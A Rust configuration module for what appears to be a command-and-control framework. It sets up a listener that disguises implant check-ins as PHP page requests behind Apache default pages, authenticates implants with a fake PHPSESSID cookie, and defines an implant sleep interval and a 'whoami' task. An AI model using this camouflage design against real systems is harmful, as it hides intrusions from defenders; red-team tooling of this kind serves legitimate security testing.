use config::{Config, File};
use serde::Deserialize;
use config::FileFormat;

/*
Reference:
https://blog.logrocket.com/configuration-management-in-rust-web-services/
*/

#[derive(Debug, Deserialize, Clone)]
pub struct Settings
{
    pub client: ClientSettings,
    pub listener: Listener,
    pub implant: Implant,
    pub binaries: BinariesPaths
}

#[derive(Debug, Deserialize, Clone)]
pub struct ClientSettings
{
    pub main_tag: String
}

#[derive(Debug, Deserialize, Clone)]
pub struct Listener
{
    pub http: HttpListenerSettings
}

#[derive(Debug, Deserialize, Clone)]
pub struct HttpListenerSettings
{
    pub address: String,
    pub port: u16,
    pub pull_method: String,
    pub pull_endpoint: String,
    pub push_method: String,
    pub push_endpoint: String,
    pub default_page_path: String,
    pub default_error_page_path: String,
    pub auth_cookie_regex: String,
    pub responses: HttpResponsesSettingsGroup
}

#[derive(Debug, Deserialize, Clone)]
pub struct Implant
{
    pub sleep: u32,
    pub tasks: ImplantTaskSettings
}

#[derive(Debug, Deserialize, Clone)]
pub struct ImplantTaskSettings
{
    pub use_commands_codes: bool,
    pub use_alt_names: bool,
    pub commands: Vec<ImplantTaskCommand>
}

#[derive(Debug, Deserialize, Clone)]
pub struct ImplantTaskCommand
{
    pub name: String,
    pub description: String,
    pub code: String,
    pub alt_name: String
}

#[derive(Debug, Deserialize, Clone)]
pub struct HttpResponsesSettings
{
    pub status_code: u16,
    pub status_code_reason: String,
    pub http_version: u8,
    pub headers: Vec<HttpHeader>
}

#[derive(Debug, Deserialize, Clone)]
pub struct HttpResponsesSettingsGroup
{
    pub default_success: HttpResponsesSettings,
    pub default_error: HttpResponsesSettings,
    pub implant_pull_success: HttpResponsesSettings,
    pub implant_pull_failure: HttpResponsesSettings,
    pub implant_push_success: HttpResponsesSettings,
    pub implant_push_failure: HttpResponsesSettings
}

#[derive(Debug, Deserialize, Clone)]
pub struct HttpHeader
{
    pub name: String,
    pub value: String
}

#[derive(Debug, Deserialize, Clone)]
pub struct BinariesPaths
{
    pub vcvarsall: String,
    pub msbuild: String
}

/*
Reference:
https://github.com/mehcode/config-rs/blob/master/examples/hierarchical-env/settings.rs
*/
impl Settings
{
    pub fn new() -> Self
    {
        let config_builder = Config::builder();
        let mut config: Self = Self {
            client: ClientSettings
            {
                main_tag: String::from("~")
            },
            listener: Listener
            {
                http: HttpListenerSettings
                {
                    address: String::from("~"),
                    port: 4444,
                    pull_method: String::from("GET"),
                    pull_endpoint: String::from("/index.php"),
                    push_method: String::from("POST"),
                    push_endpoint: String::from("/submit.php"),
                    default_page_path: String::from("./static/http/apache_default_page.html"),
                    default_error_page_path: String::from("./static/http/apache_default_error_page.html"),
                    auth_cookie_regex: String::from("Cookie: PHPSESSID=([A-Fa-f0-9]{32})"),
                    responses: HttpResponsesSettingsGroup
                    {
                        default_success: HttpResponsesSettings
                        {
                            status_code: 200,
                            status_code_reason: String::from("OK"),
                            http_version: 1,
                            headers: vec![]
                        },
                        default_error: HttpResponsesSettings
                        {
                            status_code: 404,
                            status_code_reason: String::from("Not Found"),
                            http_version: 1,
                            headers: vec![]
                        },
                        implant_pull_success: HttpResponsesSettings
                        {
                            status_code: 200,
                            status_code_reason: String::from("OK"),
                            http_version: 1,
                            headers: vec![]
                        },
                        implant_pull_failure: HttpResponsesSettings
                        {
                            status_code: 404,
                            status_code_reason: String::from("Not Found"),
                            http_version: 1,
                            headers: vec![]
                        },
                        implant_push_success: HttpResponsesSettings
                        {
                            status_code: 200,
                            status_code_reason: String::from("OK"),
                            http_version: 1,
                            headers: vec![]
                        },
                        implant_push_failure: HttpResponsesSettings
                        {
                            status_code: 404,
                            status_code_reason: String::from("Not Found"),
                            http_version: 1,
                            headers: vec![]
                        }
                    }
                }
            },
            implant: Implant
            {
                sleep: 60,
                tasks: ImplantTaskSettings
                {
                    use_commands_codes: false,
                    use_alt_names: false,
                    commands: vec![
                        ImplantTaskCommand
                        {
                            name: String::from("whoami"),
                            description: String::from("Display the current username"),
                            code: String::from("1"),
                            alt_name: String::from("whoami")
                            
                        }
                    ]
                }
            },
            binaries: BinariesPaths
            {
                vcvarsall: String::new(),
                msbuild: String::new()
            }
        };
    

        match config_builder.add_source(
            File::new(
                "config/default",
                FileFormat::Json
            )
        ).build()
        {
            Ok(loaded_config) => {
                match loaded_config.try_deserialize()
                {
                    Ok(new_config) => 
                    {
                        config = new_config
                    },
                    Err(_) => {}
                };
            },
            Err(_) => {}
        };

        return config;
        
    }
}
